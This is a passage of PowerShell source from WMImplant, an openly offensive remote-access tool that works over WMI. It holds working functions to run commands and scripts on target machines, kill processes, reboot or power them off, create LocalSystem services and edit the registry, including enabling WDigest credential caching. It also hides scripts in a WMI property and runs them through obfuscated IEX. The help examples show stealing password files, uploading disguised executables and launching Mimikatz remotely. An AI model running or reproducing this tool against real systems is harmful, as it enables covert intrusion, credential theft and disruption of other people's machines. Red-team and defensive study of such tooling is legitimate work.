            $GenRegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
            $GenRegValue = Read-Host "What's the registry subkey you'd like to modify? Ex: WMImplantInstalled >"

            switch($GenRegMethod)
            {
                "create"
                {
                    $GenRegData = Read-Host "What's the data you'd like to modify? >"
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData -Target $GenTarget`n"
                    }
                }

                "delete"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -Target $GenTarget`n"
                    }
                }
            }
            $Command

        }

        "remote_posh"
        {
            $PoshLocation = Read-Host "What's the file location where the PowerShell script you want to run is located? >"
            $PoshFunction = Read-Host "What's the PowerShell Function you'd like to call? >"

            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -RemotePosh -Location $PoshLocation -Function $PoshFunction -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -RemotePosh -Location $PoshLocation -Function $PoshFunction -Target $GenTarget`n"
            }
            $Command
        }

        "service_mod"
        {
            $GenServiceAction = Read-Host "Do you want to [start], [stop], [create], or [delete] a service? >"
            $GenServiceAction = $GenServiceAction.Trim().ToLower()
            $GenServiceName = Read-Host "What is the name of the service? >"

            switch($GenServiceAction)
            {
                "start"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -ServiceStart -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -ServiceStart -ServiceName $GenServiceName -Target $GenTarget`n"
                    }
                }

                "stop"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -ServiceStop -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -ServiceStop -ServiceName $GenServiceName -Target $GenTarget`n"
                    }
                }

                "delete"
                {
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -ServiceDelete -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -ServiceDelete -ServiceName $GenServiceName -Target $GenTarget`n"
                    }
                }

                "create"
                {
                    $GenServicePath = Read-Host "What's the full path to the binary that will be used by the service?"
                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -ServiceCreate -ServiceName $GenServiceName -RemoteFile $GenServicePath -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                    }
                    else
                    {
                        $Command = "`nInvoke-WMImplant -ServiceCreate -ServiceName $GenServiceName -RemoteFile $GenServicePath -Target $GenTarget`n"
                    }
                }
            }
            $Command
        }

        "process_kill"
        {
            $GenKillMethod = Read-Host "Do you want to kill a process by its [name] or [pid]? >"
            $GenKillMethod = $GenKillMethod.Trim().ToLower()

            switch($GenKillMethod)
            {
                "name"
                {
                    $GenProcName = Read-Host "What's the name of the process you want to kill? >"
                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessName $GenProcName -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessName $GenProcName -Target $GenTarget`n"
                    }
                }

                "pid"
                {
                    $GenProcID = Read-Host "What's the Process ID of the process you want to kill? >"
                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -Target $GenTarget`n"
                    }
                }
            }
            $Command
        }

        "process_start"
        {
            $GenProcPath = Read-Host "What's the path to the binary you want to run? >"
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -ProcessStart -RemoteFile $GenProcPath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -ProcessStart -RemoteFile $GenProcPath -Target $GenTarget`n"
            }
            $Command
        }

        "ps"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -PS -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -PS -Target $GenTarget`n"
            }
            $Command
        }

        "active_users"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -ActiveUsers -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -ActiveUsers -Target $GenTarget`n"
            }
            $Command
        }

        "basic_info"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -BasicInfo -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -BasicInfo -Target $GenTarget`n"
            }
            $Command
        }

        "drive_list"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -DriveList -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -DriveList -Target $GenTarget`n"
            }
            $Command
        }

        "ifconfig"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -IFConfig -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -IFConfig -Target $GenTarget`n"
            }
            $Command
        }

        "installed_programs"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -InstalledPrograms -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -InstalledPrograms -Target $GenTarget`n"
            }
            $Command
        }

        "logon_events"
        {
            $GenSaveFile = Read-Host "Do you want to save the log output to a file? [yes/no] >"
            $GenSaveFile = $GenSaveFile.Trim().ToLower()

            switch($GenSaveFile)
            {
                "yes"
                {
                    $GenFileSave = Read-Host "What's the full path to where you'd like the output saved? >"
                    $GenFileSave = $GenFileSave.Trim()

                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword -LocalFile $GenFileSave`n"
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget -LocalFile $GenFileSave`n"
                    }
                }

                default
                {
                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                    {
                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                    }

                    else
                    {
                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget`n"
                    }
                }
            }
            $Command
        }

        "logoff"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -LogOff -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -LogOff -Target $GenTarget`n"
            }
            $Command
        }

        "reboot"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -Reboot -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -Reboot -Target $GenTarget`n"
            }
            $Command
        }

        "power_off"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -PowerOff -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -PowerOff -Target $GenTarget`n"
            }
            $Command
        }

        "vacant_system"
        {
            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
            {
                $Command = "`nInvoke-WMImplant -VacantSystem -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
            }

            else
            {
                $Command = "`nInvoke-WMImplant -VacantSystem -Target $GenTarget`n"
            }
            $Command
        }

        default
        {
            Write-Output "You did not select a valid command!  Please try again!"
        }
    } #End of switch
} #End of Function

function Invoke-ProcessPunisher
{
    # This function kills a process on the targeted system via name or PID
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$PName,
        [Parameter(Mandatory = $False)] 
        [string]$ProcId
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$PName -and !$ProcId)
        {
            $kill_method = Read-Host "Do you want to kill a process by [name] or [pid]? >"
            $kill_method = $kill_method.Trim().ToLower()

            if($kill_method -eq "name")
            {
                $PName = Read-Host "What is the name of the process you want to kill? >"
                $PName = $PName.Trim().ToLower()
            }
            elseif($kill_method -eq "pid")
            {
                $ProcID = Read-Host "What is the process id you want to kill? >"
                $ProcID = $ProcID.Trim().ToLower()
            }
            else
            {
                Throw "You need to kill a process by its name or PID!"
            }
        }

        if($PName)
        {
            Write-Verbose "Killing process via process name"

            if($Creds)
            {
                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $Target -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
            }
            else
            {
                Get-WmiObject -Class win32_Process -Computername $Target -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
            }
        }

        elseif($ProcID)
        {
            Write-Verbose "Killing process via process ID"

            if($Creds)
            {
                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $Target -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
            }
            else
            {
                Get-WmiObject -Class win32_Process -Computername $Target -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
            }
        }
    }
    end{}
}

function Invoke-PowerOptionsWMI
{
    # This function allows users to poweroff, reboot, or log users off the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False, ParameterSetName='shutdown')] 
        [switch]$Shutdown,
        [Parameter(Mandatory = $False, ParameterSetName='reboot')] 
        [switch]$Reboot,
        [Parameter(Mandatory = $False, ParameterSetName='logoff')] 
        [switch]$Logoff
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Shutdown -and !$Reboot -and !$Logoff)
        {
            $Action = Read-Host "Are you looking to [reboot], [shutdown], or [logoff] users on the target system? >"
            $Action = $Action.Trim().ToLower()

            switch($Action)
            {
                "reboot"
                {
                    $Reboot = $true
                }

                "shutdown"
                {
                    $Shutdown = $true
                }

                "logoff"
                {
                    $Logoff = $true
                }
            }
        }

        if($Shutdown)
        {
            $power_option = 5
        }
        elseif($Reboot)
        {
            $power_option = 6
        }
        elseif($Logoff)
        {
            $power_option = 4
        }

        Write-Verbose "Connecting to $Target"

        if($Creds)
        {
            (gwmi win32_operatingsystem -Credential $Creds -ComputerName $Target).Win32Shutdown($power_option)
        }
        else
        {
            (gwmi win32_operatingsystem -ComputerName $Target).Win32Shutdown($power_option)
        }
    }
    end{}
}

function Invoke-ProcSpawn
{
    # This function starts a user provided process on the targeted system
    # (File/executable must already be on the system)
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$Command
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Command)
        {
            $Command = Read-Host "What command do you want to run? >"
            $Command = $Command.Trim()
        }

        if($Creds)
        {
            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -Computername $Target
        }

        else
        {
            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Computername $Target
        }
    }

    end{}
}

function Invoke-RegValueMod
{
    # This function allows you to modify the registry on a remote system.  At the moment, it's
    # largely constrained to STRING type mods, although this is beginning to expand
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [switch]$KeyCreate,
        [Parameter(Mandatory = $False)] 
        [switch]$KeyDelete,
        [Parameter(Mandatory = $False)] 
        [string]$RegHive,
        [Parameter(Mandatory = $False)] 
        [string]$RegKey,
        [Parameter(Mandatory = $False)] 
        [string]$RegSubKey,
        [Parameter(Mandatory = $False)] 
        [string]$RegValue
    )

    Process
    {
        $hklm = 2147483650
        $hkcu = 2147483649
        $hkcr = 2147483648
        $hkusers = 2147483651
        $hkcurrentconfig = 2147483653

        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$RegHive)
        {
            $RegHive = Read-Host "What hive would you like to modify? Ex: hklm >"
            $RegHive = $RegHive.Trim().ToLower()

            switch($RegHive.ToLower())
            {
                "hklm"
                {
                    $hivevalue = $hklm
                }

                "hkcu"
                {
                    $hivevalue = $hkcu
                }

                "hkcr"
                {
                    $hivevalue = $hkcr
                }

                "hkusers"
                {
                    $hivevalue = $hkusers
                }

                "hkcurrentconfig"
                {
                    $hivevalue = $hkcurrentconfig
                }

                default
                {
                    $hivevalue = $hkcu
                }
            }
        }
        else
        {
            switch($RegHive.ToLower())
            {
                "hklm"
                {
                    $hivevalue = $hklm
                }

                "hkcu"
                {
                    $hivevalue = $hkcu
                }

                "hkcr"
                {
                    $hivevalue = $hkcr
                }

                "hkusers"
                {
                    $hivevalue = $hkusers
                }

                "hkcurrentconfig"
                {
                    $hivevalue = $hkcurrentconfig
                }

                default
                {
                    $hivevalue = $hkcu
                }
            }
        }

        if(!$RegKey)
        {
            $RegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
        }

        if(!$RegSubKey)
        {
            $RegSubKey = Read-Host "What's the registry Sub Key you'd like to modify? Ex: WMImplantInstalled >"
        }

        if ((!$KeyCreate) -and (!$KeyDelete))
        {
            $question = Read-Host "Do you want to [create] or [delete] a key? >"
            $question = $question.Trim().ToLower()

            if($question.ToLower() -eq "create")
            {
                $KeyCreate = $True
            }
            else
            {
                $KeyDelete = $True
            }
        }

        if($KeyCreate)
        {
            if(!$RegValue)
            {
                $RegValue = Read-Host "What's the data you'd like for the registry value being modified? >"
            }

            if($Creds)
            {
                if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig") 
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target -Credential $Creds
                }
                else
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $Target -Credential $Creds
                }
            }

            else
            {
                if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig")
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target
                }
                else
                {
                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $Target
                }
            }
        }

        elseif($KeyDelete)
        {
            if($Creds)
            {
                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $Target -Credential $Creds
            }

            else
            {
                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $Target
            }
        }
    }
    end{}
}

function Invoke-RemoteScriptWithOutput
{
    # This function will start a new PowerShell process on the targeted system, IEX load a user specified script,
    # run the user specified function, store the output, and retrieve the output
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)] 
        [string]$Location,
        [Parameter(Mandatory = $False)] 
        [string]$Function
    )

    Process
    {
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Location)
        {
            $Location = Read-Host "Please provide the full path to the local PowerShell script you'd like to run on the target >"
            $Location = $Location.Trim()
        }

        if(!$Function)
        {
            $Function = Read-Host "Please provide the PowerShell function you'd like to run >"
            $Function = $Function.Trim()
        }

        # Saving original WMI Property value
        if($Creds)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target).DebugFilePath
        }

        # Read in and store the script to run
        $script_to_run = Get-Content -Encoding byte -Path $Location
        $encoded_script = [Int[]][Char[]]$script_to_run -Join ','

        if($Creds)
        {
            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
        }
        else
        {
            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
        }
        $modify_wmi_prop.DebugFilePath = $encoded_script
        $null = $modify_wmi_prop.Put()

        Write-Verbose "Building PowerShell command"
        # Separating the commands out to make it a little easier to view/understand what is happening
        $remote_command = '$a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a = [char[]][int[]]$a.DebugFilePath.Split('','') -Join ''''; $a | .(-Join[char[]]@(105,101,120));'
        $remote_command += '$output = '
        $remote_command += "($Function | Out-String).Trim();"
        $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
        $remote_command += ' $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'

        Write-Verbose "Running command on remote system..."

        if($Creds)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $Creds -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
        }

        # Grab output from remote system
        Write-Verbose "Sleeping, and then reading file from remote system"
        Start-Sleep -s 30

        if($Creds)
        {
            $results = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target -Credential $Creds
        }
        else
        {
            $results = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $Target
        }

        $decode = [char[]][int[]]$results.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Removing Registry value from remote system
        Write-Verbose "Removing registry value from remote system"
        $results.DebugFilePath = $Original_WMIProperty
        $null = $results.Put()

        Write-Verbose "Done!"
    }
}

function Invoke-ServiceMod
{
    # This script allows users to start, stop, create, and delete services on the targeted host
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Creds,
        [Parameter(Mandatory = $False)]
        [string]$Target,
        [Parameter(Mandatory = $False)]
        [string]$Service,
        [Parameter(Mandatory = $False)] 
        [switch]$Start,
        [Parameter(Mandatory = $False)] 
        [switch]$Stop,
        [Parameter(Mandatory = $False)] 
        [switch]$Create,
        [Parameter(Mandatory = $False)] 
        [string]$NewServiceName,
        [Parameter(Mandatory = $False)] 
        [string]$NewServicePath,
        [Parameter(Mandatory = $False)] 
        [switch]$Delete
    )

    Process
    {   
        if(!$Target)
        {
            $Target = Read-Host "What system are you targeting? >"
            $Target = $Target.Trim()
        }

        if(!$Start -and !$Stop -and !$Delete -and !$Create)
        {
            $ServiceGoal = Read-Host "Do you want to [stop], [start], [delete], or [create] a service? >"
            $ServiceGoal = $ServiceGoal.Trim().ToLower()

            switch($ServiceGoal)
            {
                "start"
                {
                    $Start = $true
                }

                "stop"
                {
                    $Stop = $true
                }

                "delete"
                {
                    $Delete = $true
                }

                "create"
                {
                    $Create = $true
                }
            }
        }

        if ($Start -or $Stop -or $Delete)
        {
            if(!$Service)
            {
                $Service = Read-Host "What is the name of the service you are targeting? >"
                $Service = $Service.Trim()
            }

            $filter = "name='$Service'"

            if($Creds)
            {
                $SystemService = Get-WmiObject -class win32_service -ComputerName $Target -Filter $filter -Credential $Creds
            }
            else
            {
                $SystemService = Get-WmiObject -class win32_service -ComputerName $Target -Filter $filter
            }
            if($Start)
            {
                $SystemService.StartService()
            }
            elseif($Stop)
            {
                $SystemService.StopService()
            }
            elseif($Delete)
            {
                $SystemService.Delete()
            }
        }
        elseif($Create)
        {
            if(!$NewServiceName)
            {
                $NewServiceName = Read-Host "Please provide the name for the service you'd like to create. >"
                $NewServiceName = $NewServiceName.Trim()
            }

            if(!$NewServicePath)
            {
                $NewServicePath = Read-Host "Please provide the path to your new service binary. >"
                $NewServicePath = $NewServicePath.Trim()
            }

            $args = $false,$NewServiceName,0,$null,$null,$NewServiceName,$NewServicePath,$null,16,"Automatic","LocalSystem",$null
            
            if($Creds)
            {
                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $Target -Credential $Creds
            }
            else
            {
                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $Target
            }
        }
    }
    end{}
}

function Invoke-WMImplant
{
    <#
    .SYNOPSIS
    This function starts all of WMImplant and is designed to display the main menu.

    .DESCRIPTION
    This is the main WMImplant function.  When calling Invoke-WMImplant you will be presented with the main menu.

    .DESCRIPTION
    This parameter is used to start WMImplant in an interactive manner. This is done by default, unless specifying a command

    .PARAMETER RemoteUser
    Specify a username. Default is the current user context.  This user is used to connect to remote systems.

    .PARAMETER RemotePass
    Specify the password for the appropriate user. This is the password for the account used to connect to remote systems.

    .PARAMETER ListCommands
    List the available commands within WMImplant.

    .PARAMETER LocalFile
    This parameter is used when user's need to provide the path to a file locally for interaction (uploading a local file or providing a path to download a file to locally), or when saving event log information locally.

    .PARAMETER RemoteFile
    This parameter is used when user's need to provide the path to a file remotely for interaction (downloading a remote file or providing a path to upload a file to) or when needing to specify a directory (such as a directory where you want to list all its contents).
    
    .PARAMETER RemoteDirectory
    This parameter is used when specifying a directory for listing its contents

    .PARAMETER RemoteDrive
    This parameter is used when you need to specify a drive to search on a remote system.

    .PARAMETER RemoteCommand
    This parameter is used to specify a command to run on a remote system.

    .PARAMETER RemoteExtension
    This parameter is used when you need to specify a file extension to search for on a remove machine.

    .PARAMETER Target
    This parameter specifies the system to execute the WMImplant command on.

    .PARAMETER Function
    This parameter specifies the function to run when remotely running PowerShell

    .PARAMETER ProcessName
    This parameter specifies the process name when killing a process by name.

    .PARAMETER ProcessID
    This parameter specifies the process ID to use when killing a process by ID.

    .PARAMETER ServiceStart
    This parameter specifies that a service will be started.

    .PARAMETER ServiceStop
    This parameter specifies that a service will be stopped.

    .PARAMETER ServiceCreate
    This parameter specifies that a service will be create.

    .PARAMETER ServiceDelete
    This parameter specifies that a service will be deleted.

    .PARAMETER ServiceName
    This parameter specifies the name of the service when one is being created.

    .PARAMETER RemoteID
    This parameter can be used to specify a Job ID for deletion.

    .PARAMETER Time
    This parameter can be used to specify the time (Ex: 15:35).

    .PARAMETER RegMethod
    This parameter specifies if you are creating or deleting a registry value.

    .PARAMETER RegHive
    This parameter specifies the registry hive you will use (between hklm and hkcu).

    .PARAMETER RegKey
    This parameter specifies the registry key that will be modified.

    .PARAMETER RegSubKey
    This parameter specifies the registry sub key that will be modified.

    .PARAMETER RegValue
    This parameter contains the data that's added to a registry value when it is created.

    .PARAMETER KeyCreate
    This parameter specifies that a registry key will be deleted.

    .PARAMETER KeyDelete
    This parameter specifies that a registry key will be created.

    .PARAMETER Cat
    This parameter specifies that WMImplant will read the contents of the specified file.

    .PARAMETER Download
    This parameter specifies that WMImplant will download a specified file.

    .PARAMETER Upload
    This parameter specifies that WMImplant will upload a specified file.

    .PARAMETER CommandExec
    This parameter specifies that WMImplant will run a command and return the output.

    .PARAMETER DisableWDigest
    This parameter specifies that WMImplant will remove the UseLogonCredential registry key from the targeted system.

    .PARAMETER DisableWinRM
    This parameter will have WMImplant attempt to force disable WinRM on the targeted system.

    .PARAMETER EnableWdigest
    This parameter will have WMImplant set the UseLogonCredential registry key on the targeted system

    .PARAMETER EnableWinRM
    This parameter will have WMImplant attempt to force enable WinRM on the targeted system.

    .PARAMETER RemotePosh
    This parameter will tell WMImplant to run a PowerShell command on the targeted system

    .PARAMETER SetWMIDefault
    This parameter sets the DebugFilePath property back to the default MS value.

    .PARAMETER PS
    This parameter specifies that WMImplant will perform a process listing on the targeted system

    .PARAMETER ProcessKill
    This parameter specifies that WMImplant will kill a process on the targeted system.

    .PARAMETER ProcessStart
    This parameter specifies that WMImplant will start a process on the targeted system.

    .PARAMETER ActiveUsers
    This parameter specifies that WMImplant will pull user accounts with active processes on the targeted system.

    .PARAMETER BasicInfo
    This parameter specifies that WMImplant will retrieve basic information about the targeted system.

    .PARAMETER DriveList
    This parameter specifies that WMImplant will pull a listing of drives from the targeted system.

    .PARAMETER IFConfig
    This parameter specifies that WMImplant will pull NICs with active connections on the targeted system.

    .PARAMETER InstalledPrograms
    This parameter directs WMImplant to retrieve a list of the programs installed on the targeted system.

    .PARAMETER VacantSystem
    This parameter directs WMImplant to try to determine if a user is active at the targeted system, or is they are afk.

    .PARAMETER LogonEvents
    This parameter directs WMImplant to pull a list of user accounts that log into the targeted system.

    .PARAMETER LogOff
    This paremeter directs WMImplant to log users off the targeted system.

    .PARAMETER Reboot
    This parameter directs WMImplant to reboot the targeted system.

    .PARAMETER PowerOff
    This parameter directs WMImplant to shut down the targeted system.

    .PARAMETER Location
    This parameter specifies the path to the PowerShell script you will run on the targeted system.

    .EXAMPLE
    > Invoke-WMImplant
    This will run the main menu and allow for easy interaction

    .EXAMPLE
    > Invoke-WMImplant -ListCommands
    This will list all available commands supported within WMImplant.

    .EXAMPLE
    > Invoke-WMImplant -Cat -RemoteUser Chris -RemotePass Pass123 -RemoteFile C:\Users\Chris\Desktop\secrets.txt -Target windowspc
    This command uses the "cat" command, and attempts to read the secrets.txt file with the provided username and password on the windowspc system

    .EXAMPLE
    > Invoke-WMImplant -Cat -RemoteFile C:\Users\Chris\Desktop\pass.txt -Target windowspc
    This command uses the "cat" command, and attempts to read the pass.txt file within the context of the current user on the windowspc system

    .EXAMPLE
    > Invoke-WMImplant -Upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -Target securewindows
    This command uploads the C:\notavirus.exe file locally to the securewindows system at C:\Windows\TEMP\safe.exe and authenticates to the remote system with the Chris account and the target downloads it from local systme using the King account.

    .EXAMPLE
    > Invoke-WMImplant -Download -RemoteFile C:\passwords.txt -LocalFile C:\Users\Chris\Downloads\passwords.txt -Target mysystem
    This command attempts to download the file C:\passwords.txt on the remote system "mysystem" locally to C:\Users\Chris\Downloads\passwords.txt.  It authenticates to the remote machine (to download the file) using the current user's context, and then is downloaded localy.
    
    .EXAMPLE
    > Invoke-WMImplant -LS -RemoteFile C:\Users\Chris\Downloads -Target win7computer
    This command will get a directory list of all files within C:\Users\Chris\Downloads on the "win7computer" system under the current user's context.

    .EXAMPLE
    > Invoke-WMImplant -Search -RemoteFile password.txt -Drive C: -Target chrispc -RemoteUser homedomain\Chris -RemotePass pass123
    This command searches the remote system "chrispc" for any file called password.txt on the C drive and authenticates using the credentials provided.

    .EXAMPLE
    > Invoke-WMImplant -Search -RemoteExtension sql -Drive C: -Target computer2
    This command uses the current user's context to search the "computer2" system for any file on the C drive that has a "sql" file extension.

    .EXAMPLE
    > Invoke-WMImplant -Remote_Posh -Location C:\test.ps1 -Function Invoke-Mimikatz -Target win7sys -RemoteUser test\admin -Pass admin123
